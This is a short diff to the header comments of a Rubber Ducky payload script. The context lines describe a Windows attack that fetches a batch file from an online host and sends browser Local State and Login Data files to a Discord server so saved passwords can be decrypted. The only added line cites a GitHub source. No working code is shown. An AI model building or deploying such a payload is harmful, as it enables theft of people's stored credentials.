@@ -3,6 +3,7 @@ REM Author: Tarnishsilver
 REM Description: Sends localstate and login data files to discord server, which can be decrypted to get usernames and passwords in plain text.
 REM Description: Rubber Ducky can be removed within 3-4 seconds as attack takes place from a file online. Thus, attack takes place very fast.
 REM Target: Windows
+REM Source: https://github.com/Tarnishsilver/usbrubberducky-payloads/tree/master
 
 REM Prerequisites: 
 REM - Upload "attack_file.bat" to google drive or any service which can give direct links to download file.
